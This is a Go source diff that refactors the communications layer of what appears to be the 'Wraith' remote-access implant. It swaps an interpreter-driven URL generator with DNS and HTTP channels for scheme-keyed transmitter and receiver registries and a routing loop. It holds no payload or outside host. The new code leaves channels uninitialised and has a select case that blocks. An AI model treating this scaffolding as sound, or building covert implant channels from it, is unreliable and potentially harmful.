@@ -1,159 +1,79 @@
 package comms
 
 import (
-	"fmt"
 	"net/url"
-
-	"github.com/0x1a8510f2/wraith/config"
-	"github.com/traefik/yaegi/interp"
 )
 
-func NewRadio() Radio {
-	r := Radio{
-		Transmitter: Antenna{
-			URLGenerator:         config.Config.Radio.Transmitter.URLGenerator,
-			TriggerCheckInterval: config.Config.Radio.Transmitter.TriggerCheckInterval,
-		},
-		Receiver: Antenna{
-			URLGenerator:         config.Config.Radio.Receiver.URLGenerator,
-			TriggerCheckInterval: config.Config.Radio.Receiver.TriggerCheckInterval,
-		},
-		FrequencyMap: make(map[string]Frequency),
-	}
-
-	r.Transmitter.Crypto.Enabled = config.Config.Radio.Transmitter.Encryption.Enabled
-	r.Transmitter.Crypto.Type = config.Config.Radio.Transmitter.Encryption.Type
-	r.Transmitter.Crypto.Key = config.Config.Radio.Transmitter.Encryption.Key
-
-	r.Receiver.Crypto.Enabled = config.Config.Radio.Receiver.Encryption.Enabled
-	r.Receiver.Crypto.Type = config.Config.Radio.Receiver.Encryption.Type
-	r.Receiver.Crypto.Key = config.Config.Radio.Receiver.Encryption.Key
-
-	r.FrequencyMap["dns"] = frequencies.DNS{}
-	r.FrequencyMap["http"] = frequencies.HTTP{}
-	r.FrequencyMap["https"] = r.FrequencyMap["http"]
-
-	r.TransmitQueue = make(chan []byte)
-	r.ReceiveQueue = make(chan []byte)
-
-	r.RunFlag = true
-
-	return r
+// Structures for transmitters and receivers
+type Tx struct {
+	Start   func()
+	Stop    func()
+	Main    func()
+	Trigger func()
+	Queue   TxQueue
+}
+type Rx struct {
+	Start   func()
+	Stop    func()
+	Main    func()
+	Trigger func()
+	Queue   RxQueue
 }
 
-type Radio struct {
-	Transmitter   Antenna
-	Receiver      Antenna
-	TransmitQueue chan []byte
-	ReceiveQueue  chan []byte
-	RunFlag       bool
-	FrequencyMap  map[string]Frequency
+// The queue types, which store inbound and outbound data
+type TxQueue chan TxQueueElement
+type TxQueueElement struct {
+	Addr string
+	Data map[string]interface{}
+}
+type RxQueue chan RxQueueElement
+type RxQueueElement struct {
+	Data map[string]interface{}
 }
 
-type Antenna struct {
-	URLGenerator         string
-	Trigger              string
-	TriggerCheckInterval int
-	LastTimestamp        int
-	LastURL              string
-	Crypto               struct {
-		Enabled bool
-		Type    int
-		Key     string
-	}
-	Verifier struct {
-		Enabled bool
-		Type    int
-		Key     string
-	}
+// Maps mapping URL schemes to individual transmitters and receivers
+var transmitters map[string]*Tx
+var receivers map[string]*Rx
+
+// A unified rx channel to collect data from all receivers in one place
+var unifiedRxQueue RxQueue
+
+// Channel used to make the comms manager exit cleanly
+var managerExitTrigger chan struct{}
+
+// Register a transmitter to make it useable by the Wraith
+func RegTx(scheme string, tx *Tx) {
+	transmitters[scheme] = tx
 }
 
-type Frequency interface {
-	Transmit(string, []byte) error
-	Receive(string) ([]byte, error)
+// Register a receiver to make it useable by the Wraith (and inject the unifiedRxQueue)
+func RegRx(scheme string, rx *Rx) {
+	rx.Queue = unifiedRxQueue
+	receivers[scheme] = rx
 }
 
-func (r *Radio) GenerateRadioURL(urltype int) (string, error) {
-	var module Antenna
-	if urltype == 0 {
-		module = r.Transmitter
-	} else if urltype == 1 {
-		module = r.Receiver
-	} else {
-		return "", fmt.Errorf("invalid urltype")
-	}
-	// Use yaegi to run function to generate the next URL
-	i := interp.New(interp.Options{})
-	_, err := i.Eval(r.Transmitter.URLGenerator)
-	if err != nil {
-		return "", err
-	}
-	v, err := i.Eval("gen.Gen")
-	if err != nil {
-		return "", err
-	}
-	gen := v.Interface().(func(string) string)
-	result := gen(module.LastURL)
-	// TODO: Check if result is valid URL
-	return result, nil
-}
-
-func CheckCommsTrigger(commtype int) (bool, error) {
-	return true, nil
-}
-
-func (r *Radio) Transmit() error {
-	// Generate URL
-	transmitAddr, err := r.GenerateRadioURL(0)
-	if err != nil {
-		return err
-	}
-	// Parse the URL for the protocol
-	parsed, err := url.Parse(transmitAddr)
-	if err != nil {
-		return err
-	}
-	if freq, exists := r.FrequencyMap[parsed.Scheme]; exists {
-		err := freq.Transmit(transmitAddr, []byte{})
-		if err != nil {
-			return err
+// Infinite loop managing transmission and receiving of data
+func Manage(txQueue TxQueue, rxQueue RxQueue) {
+	for {
+		select {
+		case <-managerExitTrigger:
+			return
+		case tx := <-txQueue:
+			txaddr, err := url.Parse(tx.Addr)
+			// If there was an error parsing the URL, the whole txdata should be dropped as there's nothing more we can do
+			if err == nil {
+				// ...same in case of a non-existent transmitter
+				if transmitter, exists := transmitters[txaddr.Scheme]; exists {
+					transmitter.Queue <- tx
+				}
+			}
+		case rxQueue <- (<-unifiedRxQueue):
 		}
-	} else {
-		return fmt.Errorf("no frequency supports the scheme `%s`", parsed.Scheme)
-	}
-	return nil
-}
-
-func (r *Radio) Receive() error {
-	// Generate URL
-	receiveAddr, err := r.GenerateRadioURL(1)
-	if err != nil {
-		return err
-	}
-	// Parse the URL for the protocol
-	parsed, err := url.Parse(receiveAddr)
-	if err != nil {
-		return err
-	}
-	if freq, exists := r.FrequencyMap[parsed.Scheme]; exists {
-		_, err := freq.Receive(receiveAddr)
-		if err != nil {
-			return err
-		}
-	} else {
-		return fmt.Errorf("no frequency supports the scheme `%s`", parsed.Scheme)
-	}
-	return nil
-}
-
-func (r *Radio) RunTransmit() {
-	for r.RunFlag {
-		r.Transmit()
 	}
 }
 
-func (r *Radio) RunReceive() {
-	for r.RunFlag {
-		r.Receive()
-	}
+func init() {
+	// Initialise channel lists
+	transmitters = make(map[string]*Tx)
+	receivers = make(map[string]*Rx)
 }
